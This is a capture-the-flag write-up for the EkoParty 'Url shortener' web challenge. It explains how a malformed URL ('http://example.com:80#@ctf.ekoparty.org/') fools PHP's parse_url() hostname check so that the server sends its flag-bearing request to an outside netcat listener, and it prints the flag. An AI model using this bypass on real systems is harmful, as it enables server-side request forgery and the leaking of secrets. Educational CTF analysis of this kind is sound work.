# Url shortener - Web 200

```
We developed this url shortener, it will allow you to share links with your friends!

http://9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site:20000/

Hint
You will need to bypass the check for the hostname and send the request somewhere else!
Source code: https://paste.null-life.com/#/sGv1ZrIyhAAYCQMa6p8UFm2IFvzZhJ9yAYtkHgCcCz7bu8YE/66lTyw0 
```

It's a URL shortener, basically (except it doesn't actually work, but that doesn't matter for this challenge). The key is that you are only supposed to sorten url's that point to the ctf.ekoparty.org main site.

[Here](index.php)'s the source. There isn't an obvious vuln. However, the app makes a request to whatever URL you provide (as long as it passes the hostname check), and it puts the flag in the user agent. Then, whatever the page sets as its `<title>` is shown to the user. Since the URL is supposed to be restricted to ctf.ekoparty.org, I thought maybe there was an easter egg somewhere on the main site where the user agent gets reflected in the `<title>`. However, a quick scan with `wget` came up empty-handed.

Some Googling revealed [this](https://bugs.php.net/bug.php?id=73192) PHP vuln from September. Basically you can trick `parse_url()` (the function performing the hostname check) with a URL like this: `http://example.com:80#@ctf.ekoparty.org/`.

I set up a netcat listener on the Internet somewhere, and:

```
EKO{follow_the_rfc_rabbit}
```
